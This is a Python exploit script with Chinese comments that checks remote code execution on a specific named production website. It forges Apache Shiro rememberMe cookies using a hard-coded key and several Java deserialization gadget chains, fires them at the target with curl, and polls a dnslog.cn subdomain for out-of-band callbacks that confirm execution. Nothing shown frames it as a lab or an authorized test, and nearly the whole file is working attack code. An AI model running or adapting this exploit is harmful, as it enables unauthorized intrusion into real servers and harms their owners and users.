import os
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
admin.yibaojihua.com 真 key RCE 验证 — CB1/DNSLog 外带
deleteMe 在该目标无区分度(基线失真), 只认 DNSLog 回连 rce8 子域
"""
import requests, re, time, subprocess, os, sys

BASE = "http://<your-attack-server>:8011"
TARGET = "https://admin.yibaojihua.com/"
GOOD_KEY = "fCq+/xW488hMTCD+cmJ3aQ=="
DOMAIN = "aylm1n.dnslog.cn"
OUT_DIR = os.path.dirname(os.path.abspath(__file__))
SUB = "rce8"

# 登录
s = requests.Session()
r = s.get(BASE + "/", timeout=10)
xsrf = s.cookies.get("XSRF-TOKEN")
r = s.post(BASE + "/auth/login", json={"username": "admin", "password": os.environ.get("JCHAIN_PASS","")},
           headers={"X-XSRF-TOKEN": xsrf}, timeout=10)
print(f"[*] 登录: HTTP {r.status_code}")

def gen(chain, gcm, dom, name):
    """生成 ShiroPayload cookie: 触发链 + DNSLog 外带"""
    body = {"payload": {"type": "ShiroPayload", "encode": "base64", "options": {"urlEncoding": False}},
            "chain": [
                {"gadget": "ShiroPayload", "args": {"shiroKey": GOOD_KEY, "gcmMode": gcm, "dirtyLength": 0}},
                {"gadget": chain, "args": {}},
                {"gadget": "TemplatesImpl", "args": {}},
                {"gadget": "DNSLog", "args": {"dnslog": dom}}
            ]}
    r = s.post(BASE + "/api/generate", json=body, headers={"X-XSRF-TOKEN": xsrf}, timeout=30)
    j = r.json()
    if j.get("code") != 0:
        print(f"[!] {name} 生成失败: {str(j)[:200]}")
        return None
    c = j["data"]["output"]["content"]
    p = os.path.join(OUT_DIR, name)
    with open(p, "w") as f:
        f.write(c)
    print(f"[*] 生成 {name}: {len(c)} 字符  chain={chain} gcm={gcm}")
    return c

cases = []
for gcm in (False, True):
    m = "GCM" if gcm else "CBC"
    cases.append((f"rce_{SUB}_CB1_{m}.cookie", "CommonsBeanutils1", gcm))
    cases.append((f"rce_{SUB}_Groovy_{m}.cookie", "Groovy", gcm))
    cases.append((f"rce_{SUB}_BS1_{m}.cookie", "BeanShell1", gcm))
    cases.append((f"rce_{SUB}_Rome_{m}.cookie", "Rome1", gcm))

for name, chain, gcm in cases:
    gen(chain, gcm, f"{SUB}.{DOMAIN}", name)

# 发送全部
print("\n=== 发送 ===")
for name, chain, gcm in cases:
    p = os.path.join(OUT_DIR, name)
    if not os.path.exists(p):
        continue
    val = open(p).read().strip()
    curl_cmd = ["curl", "-s", "-k", "--noproxy", "*", "-D", "-", "-o", "/dev/null",
                "-H", f"Cookie: rememberMe={val}", TARGET, "--max-time", "20"]
    proc = subprocess.run(curl_cmd, capture_output=True, text=True, timeout=30)
    sc = proc.stdout
    dm = re.findall(r'Set-Cookie: ([^;]+);', sc)
    print(f"[{name}] {sc.splitlines()[0] if sc else '?'}  deleteMe={'是' if any('deleteMe' in d for d in dm) else '否'}")

print(f"\n[*] 全部发出, 等待 40s 查 {SUB}.{DOMAIN} 回连")
time.sleep(40)

d = subprocess.run(["python", "<workdir>/tools/dnslog_helper/dnslog.py", "poll"],
                   capture_output=True, text=True, timeout=60)
print("\n=== DNSLog 回连 ===")
print(d.stdout)
